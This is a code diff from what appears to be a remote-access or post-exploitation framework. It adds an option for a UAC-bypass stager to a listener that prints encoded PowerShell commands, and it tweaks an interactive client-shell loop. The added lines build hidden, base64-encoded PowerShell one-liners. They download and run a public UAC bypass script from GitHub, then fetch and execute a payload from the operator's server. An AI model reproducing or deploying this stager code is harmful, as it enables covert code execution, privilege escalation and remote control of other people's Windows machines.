@@ -98,7 +98,7 @@ def interactShell(clientconn,clientnumber):
     from menu import clientMenuOptions
     print "Commands\n" + "-"*24 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*24
     while True:
-        while clientconn in select.select([clientconn], [], [], 0.3)[0]:
+        while clientconn in select.select([clientconn], [], [], 0.2)[0]:
             computerName += clientconn.recv(2048)
             if len(computerName) > 1:
                 print t.bold_yellow + computerName + t.normal
@@ -160,7 +160,11 @@ def printListener():
         powershellStagerFile.close()
     randoStagerDLPort = random.randint(5000,9000)
     FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-    print 'powershell -w hidden -noni -enc ' + ("(iwr " + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + ") | iex").encode('utf_16_le').encode('base64').replace('\n','')
+    uacBypassStager = raw_input(t.bold_green + "Use UAC bypass for stager? y/[N]: " + t.normal)
+    if uacBypassStager.lower() == 'y':
+        print 'powershell -exec bypass -w hidden -enc ' + ("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1\");Invoke-EventVwrBypass -Command \"powershell.exe -w hidden -noni -c (iwr " + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + ") | iex\"").encode('utf_16_le').encode('base64').replace('\n','')
+    else:
+        print 'powershell -w hidden -noni -enc ' + ("(iwr " + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + ") | iex").encode('utf_16_le').encode('base64').replace('\n','')
     return "pass"
 
 def pingClients(clientconn,clientnumber):
